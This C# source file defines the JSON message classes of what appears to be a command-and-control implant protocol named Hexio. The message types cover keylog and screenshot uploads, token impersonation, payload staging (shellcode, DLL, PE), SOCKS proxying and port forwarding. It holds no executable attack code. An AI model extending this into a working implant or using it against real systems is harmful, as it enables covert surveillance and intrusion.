using System.Collections.Generic;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Hexio;

public class SleepUpdate
{
    [JsonPropertyName("sleep_time")] public long SleepTime { get; set; }
    [JsonPropertyName("sleep_jitter"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public long? SleepJitter { get; set; }
}

public class CommandResult
{
    [JsonPropertyName("command_id")] public long CommandId { get; set; }
    [JsonPropertyName("command")] public string Command { get; set; } = "";
    [JsonPropertyName("response")] public string Response { get; set; } = "";
}

public class SideChannelResponse
{
    [JsonPropertyName("channel_id")] public string ChannelId { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
}

public class DownloadChunkUpload
{
    [JsonPropertyName("download_id")] public string DownloadId { get; set; } = "";
    [JsonPropertyName("chunk_data")] public string ChunkData { get; set; } = "";
}

public class ScreenshotUpload
{
    [JsonPropertyName("filename")] public string Filename { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
}

public class KeylogUpload
{
    [JsonPropertyName("filename")] public string Filename { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
}

public class SocksReceive
{
    [JsonPropertyName("id")] public string Id { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
}

public class SocksSyncRequest
{
    [JsonPropertyName("closes"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Closes { get; set; }
    [JsonPropertyName("receives"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<SocksReceive>? Receives { get; set; }
}

public class SocksOpenEntry
{
    [JsonPropertyName("id")] public string Id { get; set; } = "";
    [JsonPropertyName("addr")] public string Addr { get; set; } = "";
    [JsonPropertyName("port")] public long Port { get; set; }
    [JsonPropertyName("proto")] public string Proto { get; set; } = "";
}

public class SocksSend
{
    [JsonPropertyName("id")] public string Id { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
    [JsonPropertyName("size")] public long Size { get; set; }
}

public class SocksSyncResponse
{
    [JsonPropertyName("opens"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<SocksOpenEntry>? Opens { get; set; }
    [JsonPropertyName("closes"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Closes { get; set; }
    [JsonPropertyName("send"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<SocksSend>? Send { get; set; }
}

public class PortFwdOpenRequest
{
    [JsonPropertyName("port")] public long Port { get; set; }
    [JsonPropertyName("remote_host")] public string RemoteHost { get; set; } = "";
    [JsonPropertyName("remote_port")] public long RemotePort { get; set; }
}

public class PortFwdSend
{
    [JsonPropertyName("sockid")] public string SockId { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
    [JsonPropertyName("size")] public long Size { get; set; }
}

public class PortFwdInboundData
{
    [JsonPropertyName("opens"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Opens { get; set; }
    [JsonPropertyName("sends"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdSend>? Sends { get; set; }
    [JsonPropertyName("closes"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Closes { get; set; }
}

public class PortFwdSyncRequestEntry
{
    [JsonPropertyName("port")] public long Port { get; set; }
    [JsonPropertyName("data")] public PortFwdInboundData Data { get; set; } = new();
}

public class PortFwdRecv
{
    [JsonPropertyName("sockid")] public string SockId { get; set; } = "";
    [JsonPropertyName("data")] public string Data { get; set; } = "";
    [JsonPropertyName("size")] public long Size { get; set; }
}

public class PortFwdOutboundData
{
    [JsonPropertyName("recvs"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdRecv>? Recvs { get; set; }
    [JsonPropertyName("closes"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Closes { get; set; }
}

public class PortFwdSyncResponseEntry
{
    [JsonPropertyName("port")] public long Port { get; set; }
    [JsonPropertyName("data")] public PortFwdOutboundData Data { get; set; } = new();
}

public class SyncRequest
{
    [JsonPropertyName("sleep"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public SleepUpdate? Sleep { get; set; }

    [JsonPropertyName("impersonation"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public string? Impersonation { get; set; }

    [JsonPropertyName("commands"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<CommandResult>? Commands { get; set; }

    [JsonPropertyName("side_channel_responses"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<SideChannelResponse>? SideChannelResponses { get; set; }

    [JsonPropertyName("download_init"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<DownloadInitRequest>? DownloadInit { get; set; }

    [JsonPropertyName("download_chunk"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<DownloadChunkUpload>? DownloadChunk { get; set; }

    [JsonPropertyName("download_cancel"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? DownloadCancel { get; set; }

    [JsonPropertyName("screenshots"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<ScreenshotUpload>? Screenshots { get; set; }

    [JsonPropertyName("keylog"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public KeylogUpload? Keylog { get; set; }

    [JsonPropertyName("bof_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? BofFiles { get; set; }

    [JsonPropertyName("pe_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? PeFiles { get; set; }

    [JsonPropertyName("dll_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? DllFiles { get; set; }

    [JsonPropertyName("elf_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? ElfFiles { get; set; }

    [JsonPropertyName("macho_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? MachoFiles { get; set; }

    [JsonPropertyName("shellcode_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? ShellcodeFiles { get; set; }

    [JsonPropertyName("hexlang"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Hexlang { get; set; }

    [JsonPropertyName("socks_open"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public object? SocksOpen { get; set; }

    [JsonPropertyName("socks_open_port"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public long? SocksOpenPort { get; set; }

    [JsonPropertyName("socks_close"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public object? SocksClose { get; set; }

    [JsonPropertyName("socks_sync"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public SocksSyncRequest? SocksSync { get; set; }

    [JsonPropertyName("portfwd_open"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdOpenRequest>? PortFwdOpen { get; set; }

    [JsonPropertyName("portfwd_close"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<long>? PortFwdClose { get; set; }

    [JsonPropertyName("portfwd_sync"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdSyncRequestEntry>? PortFwdSync { get; set; }

    public void TriggerSocksOpen() => SocksOpen = new { };
    public void TriggerSocksClose() => SocksClose = new { };
}

public class DownloadChunkAck
{
    [JsonPropertyName("download_id")] public string DownloadId { get; set; } = "";
    [JsonPropertyName("chunk_received")] public bool ChunkReceived { get; set; }
}

public class PortFwdOpCloseResult
{
    [JsonPropertyName("port")] public long Port { get; set; }
    [JsonPropertyName("success")] public bool Success { get; set; }
}

public class StagedFile
{
    [JsonPropertyName("filename")] public string Filename { get; set; } = "";
    [JsonPropertyName("filetype")] public string Filetype { get; set; } = "";
    [JsonPropertyName("alias")] public string Alias { get; set; } = "";
    [JsonPropertyName("filedata")] public string Filedata { get; set; } = "";
}

public class SyncResponse
{
    [JsonPropertyName("commands")] public List<Command> Commands { get; set; } = new();

    [JsonPropertyName("files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<StagedFile>? Files { get; set; }

    [JsonPropertyName("download_init"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<DownloadInitResponse>? DownloadInit { get; set; }

    [JsonPropertyName("download_chunk"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<DownloadChunkAck>? DownloadChunk { get; set; }

    [JsonPropertyName("bof_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? BofFiles { get; set; }

    [JsonPropertyName("pe_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? PeFiles { get; set; }

    [JsonPropertyName("dll_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? DllFiles { get; set; }

    [JsonPropertyName("elf_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? ElfFiles { get; set; }

    [JsonPropertyName("macho_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? MachoFiles { get; set; }

    [JsonPropertyName("shellcode_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? ShellcodeFiles { get; set; }

    [JsonPropertyName("hexlang"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public Dictionary<string, string>? Hexlang { get; set; }

    [JsonPropertyName("socks_open"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public bool? SocksOpen { get; set; }

    [JsonPropertyName("socks_port"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public long? SocksPort { get; set; }

    [JsonPropertyName("socks_close"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public bool? SocksClose { get; set; }

    [JsonPropertyName("socks_sync"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public SocksSyncResponse? SocksSync { get; set; }

    [JsonPropertyName("portfwd_open"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdOpCloseResult>? PortFwdOpen { get; set; }

    [JsonPropertyName("portfwd_close"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdOpCloseResult>? PortFwdClose { get; set; }

    [JsonPropertyName("portfwd_sync"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<PortFwdSyncResponseEntry>? PortFwdSync { get; set; }
}
